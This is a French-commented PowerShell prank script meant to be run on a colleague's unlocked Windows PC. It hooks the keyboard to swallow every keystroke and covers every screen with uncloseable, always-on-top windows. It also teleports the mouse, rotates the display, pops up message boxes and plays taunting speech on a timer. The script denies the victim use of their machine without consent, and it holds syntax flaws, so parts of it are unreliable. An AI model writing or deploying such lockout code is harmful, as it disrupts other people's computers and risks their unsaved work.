Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Speech

# ================= API ROTATION =================
Add-Type @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class KeyboardHook {
    private static IntPtr hookId = IntPtr.Zero;
    private static LowLevelKeyboardProc proc = HookCallback;

    public static void Start() {
        hookId = SetHook(proc);
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule) {
            return SetWindowsHookEx(13, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        // Bloque Alt+F4, Alt+Tab, Win
        return (IntPtr)1;
    }

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn,
        IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
}

public class Display {
    [StructLayout(LayoutKind.Sequential)]
    public struct DEVMODE {
        private const int CCHDEVICENAME = 32;
        private const int CCHFORMNAME = 32;

        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = CCHDEVICENAME)]
        public string dmDeviceName;
        public short dmSpecVersion;
        public short dmDriverVersion;
        public short dmSize;
        public short dmDriverExtra;
        public int dmFields;

        public int dmPositionX;
        public int dmPositionY;
        public int dmDisplayOrientation;
        public int dmDisplayFixedOutput;

        public short dmColor;
        public short dmDuplex;
        public short dmYResolution;
        public short dmTTOption;
        public short dmCollate;

        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = CCHFORMNAME)]
        public string dmFormName;
        public short dmLogPixels;
        public int dmBitsPerPel;
        public int dmPelsWidth;
        public int dmPelsHeight;
        public int dmDisplayFlags;
        public int dmDisplayFrequency;
    }

    [DllImport("user32.dll")]
    public static extern int ChangeDisplaySettings(ref DEVMODE devMode, int flags);

    public const int DM_DISPLAYORIENTATION = 0x80;
    public const int CDS_UPDATEREGISTRY = 0x01;
    public const int CDS_RESET = 0x40000000;
}
"@

[KeyboardHook]::Start()

function Rotate-Screen($orientation) {
    $devmode = New-Object Display+DEVMODE
    $devmode.dmSize = [System.Runtime.InteropServices.Marshal]::SizeOf($devmode)
    $devmode.dmFields = [Display]::DM_DISPLAYORIENTATION
    $devmode.dmDisplayOrientation = $orientation
    [Display]::ChangeDisplaySettings([ref]$devmode, 0) | Out-Null
}

# ================= CONFIG =================
$msgs = @(
    "La prochaine fois, tu apprendras a verrouiller ton pc :)",
    "Tu nous paie le prochain petit dej ?",
    "Pense au Windows + L;)",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
)

$ttsLines = @(
    "VROUM VROUM VROUM VROUM",
    "Verrouille ton PC la prochaine fois",
    "C'est insupportable non ?",
    "Et ça fait bim bam boum bim bam boum bim bam boum"
)

$colors = @(
    [System.Drawing.Color]::DarkRed,
    [System.Drawing.Color]::DarkBlue,
    [System.Drawing.Color]::DarkGreen,
    [System.Drawing.Color]::DarkOrange,
    [System.Drawing.Color]::HotPink,
    [System.Drawing.Color]::Aqua,
    [System.Drawing.Color]::Yellow,
    [System.Drawing.Color]::CadetBlue,
)

$rotations = @(0, 1, 2, 3) # 0°, 90°, 180°, 270°
$rotationIndex = 0

$speaker = New-Object System.Speech.Synthesis.SpeechSynthesizer

# ================= FENÊTRE PIÈGE =================
$forms = @()

foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
    $form = New-Object System.Windows.Forms.Form
    $form.StartPosition = "Manual"
    $form.Bounds = $screen.Bounds
    $form.FormBorderStyle = 'None'
    $form.TopMost = $true
    $form.BackColor = 'Black'
    $form.ControlBox = $false
    $form.ShowInTaskbar = $false
    $form.Add_FormClosing({ $_.Cancel = $true })
    $form.Show()
    $forms += $form
}

# ================= TIMER =================
$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 1200
$step = 0

$timer.Add_Tick({

    # RGB
    foreach ($f in $forms) {
        $f.BackColor = Get-Random $colors
    }

    # Souris qui se téléporte
    $x = Get-Random -Minimum 0 -Maximum [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
    $y = Get-Random -Minimum 0 -Maximum [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)

    # Rotation écran toutes les 3 itérations
    if ($step % 3 -eq 0) {
        Rotate-Screen $rotations[$rotationIndex]
        $rotationIndex = ($rotationIndex + 1) % $rotations.Count
    }

    # Message box
    if ($step % 4 -eq 0) {
        [System.Windows.Forms.MessageBox]::Show(
            (Get-Random $msgs),
            "VERROUILLE TON PC",
            [System.Windows.Forms.MessageBoxButtons]::OK,
            [System.Windows.Forms.MessageBoxIcon]::Warning
        )
    }

    # TTS
    if ($step % 2 -eq 0) {
        $speaker.SpeakAsync((Get-Random $ttsLines))
    }

    $step++
})

# ================= LANCEMENT =================
$timer.Start()
[System.Windows.Forms.Application]::Run($form)
